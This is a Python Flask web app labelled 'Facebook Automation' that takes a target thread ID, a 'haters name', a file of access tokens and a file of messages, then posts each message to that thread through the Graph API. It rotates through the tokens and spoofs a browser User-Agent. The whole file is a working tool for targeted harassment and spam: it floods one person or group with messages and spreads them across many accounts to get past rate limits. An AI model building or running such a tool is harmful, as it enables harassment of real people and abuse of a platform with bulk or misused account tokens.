from flask import Flask, request, redirect, url_for, render_template_string
import os
import time
import requests
import threading

app = Flask(__name__)

# Headers for requests
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
}

# RGB styles
RGB_STYLE = """
<style>
    body {
        background: linear-gradient(90deg, red, yellow, green, cyan, blue, violet);
        background-size: 400% 400%;
        animation: gradient 6s ease infinite;
        font-family: Arial, sans-serif;
    }
    @keyframes gradient {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }
    .container {
        margin: 100px auto;
        text-align: center;
        max-width: 600px;
        padding: 20px;
        background-color: rgba(0, 0, 0, 0.6);
        border-radius: 20px;
        color: white;
    }
    label {
        color: white;
    }
    .btn {
        padding: 10px 20px;
        margin: 10px;
        border-radius: 10px;
        cursor: pointer;
        border: none;
        color: white;
    }
    .btn-submit {
        background-color: #4CAF50;
    }
    .btn-submit:hover {
        background-color: red;
    }
    .btn-stop {
        background-color: #ff4c4c;
    }
    .btn-stop:hover {
        background-color: darkred;
    }
</style>
"""

# Stop thread flag
stop_flag = False

@app.route('/', methods=['GET', 'POST'])
def index():
    global stop_flag
    if request.method == 'POST':
        thread_id = request.form.get('threadId')
        haters_name = request.form.get('hatersName')
        delay = int(request.form.get('delay'))
        
        # Read token file
        tokens_file = request.files['tokensFile']
        tokens = tokens_file.read().decode().splitlines()
        
        # Read message file
        messages_file = request.files['messagesFile']
        messages = messages_file.read().decode().splitlines()

        # Start automation
        stop_flag = False
        threading.Thread(target=send_messages, args=(thread_id, haters_name, delay, tokens, messages)).start()

    elif 'stop' in request.form:
        stop_flag = True

    # HTML Form
    return render_template_string(f"""
    {RGB_STYLE}
    <div class="container">
        <h2>Facebook Automation</h2>
        <form method="post" enctype="multipart/form-data">
            <label for="threadId">Target Thread ID:</label><br>
            <input type="text" name="threadId" required><br><br>
            
            <label for="hatersName">Haters Name:</label><br>
            <input type="text" name="hatersName" required><br><br>
            
            <label for="delay">Delay (Seconds):</label><br>
            <input type="number" name="delay" value="5" min="1" required><br><br>
            
            <label for="tokensFile">Tokens File:</label><br>
            <input type="file" name="tokensFile" accept=".txt" required><br><br>
            
            <label for="messagesFile">Messages File:</label><br>
            <input type="file" name="messagesFile" accept=".txt" required><br><br>
            
            <button type="submit" class="btn btn-submit">Start</button>
        </form>
        <form method="post">
            <button type="submit" name="stop" class="btn btn-stop">Stop</button>
        </form>
    </div>
    """)

def send_messages(thread_id, haters_name, delay, tokens, messages):
    global stop_flag
    post_url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
    max_tokens = len(tokens)
    num_messages = len(messages)

    for i, message in enumerate(messages):
        if stop_flag:
            print("Stopping...")
            break
        
        token = tokens[i % max_tokens]
        data = {'access_token': token, 'message': f"{haters_name} {message}"}
        
        try:
            response = requests.post(post_url, json=data, headers=headers)
            if response.ok:
                print(f"[+] Sent: {message}")
            else:
                print(f"[-] Failed: {message}")
        except Exception as e:
            print(f"[!] Error: {e}")
        
        time.sleep(delay)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
                
